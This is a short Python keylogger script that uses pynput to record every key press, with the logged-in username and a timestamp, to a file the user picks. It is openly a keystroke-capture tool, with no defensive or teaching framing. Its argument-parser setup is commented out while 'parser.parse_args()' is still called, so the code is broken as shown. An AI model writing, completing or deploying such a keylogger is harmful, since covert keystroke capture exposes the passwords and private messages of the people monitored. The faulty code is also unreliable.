from pynput.keyboard import Key, Listener
from os import getlogin
import logging
import argparse
from sys import exit

#parser = argparse.ArgumentParser(description='')
#parser.add_argument('--save', dest='save', action='store', help='location to store the captured keystrokes')
args = parser.parse_args()

try:
    logging.basicConfig(filename = (args.save), level=logging.DEBUG, format='%(asctime)s: %(message)s')
except FileNotFoundError:
    print("Unable to save here...")
    exit(0)

def on_press(key):
   logging.info("[{}]: {}".format(getlogin(), str(key)))

with Listener(on_press=on_press) as listener:
    listener.join()